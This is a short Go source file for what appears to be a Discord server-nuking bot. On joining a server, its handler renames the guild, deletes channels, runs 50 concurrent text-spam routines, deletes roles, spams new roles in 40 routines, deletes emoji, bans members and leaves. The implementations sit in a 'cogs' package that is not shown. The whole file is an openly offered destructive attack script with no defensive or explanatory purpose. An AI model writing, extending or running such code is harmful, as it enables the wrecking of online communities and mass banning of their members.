package main

import (
	"src/cogs"
	"github.com/bwmarrin/discordgo"
	"sync"
)

func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
	var wg sync.WaitGroup

	cogs.Logs(s, event)
	cogs.GuildRename(s, event)

	wg.Add(1)
	go func() {
		defer wg.Done()
		cogs.DeleteChannels(s, event)
	}()
	wg.Wait()

	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			cogs.TextSpam(s, event, &wg)
		}()
	}
	wg.Wait()

	wg.Add(1)
	go func() {
		defer wg.Done()
		cogs.DeleteRoles(s, event)
	}()
	wg.Wait()

	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			cogs.RolesSpam(s, event)
		}()
	}
	wg.Wait()

	cogs.EmojiDelete(s, event)
	cogs.MemberBan(s, event)
	cogs.BotLeave(s, event)
}
